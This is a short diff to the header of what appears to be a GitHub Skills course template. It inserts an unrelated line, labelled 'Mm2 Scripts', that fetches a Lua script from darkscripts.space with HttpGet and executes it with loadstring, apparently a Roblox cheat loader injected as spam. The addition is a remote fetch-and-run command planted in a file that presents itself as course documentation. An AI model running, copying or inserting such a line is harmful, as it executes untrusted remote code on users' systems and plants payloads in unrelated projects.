@@ -1,5 +1,5 @@
 <header>
-
+@Mm2 Scripts: loadstring(game:HttpGet('https://darkscripts.space/scripts/971c5c0e-49bf-4d2d-adce-1e8a3b4052b4_770240539429175317.lua',true))()
 <!--
   <<< Author notes: Course header >>>
   Read <https://skills.github.com/quickstart> for more information about how to build courses using this template.
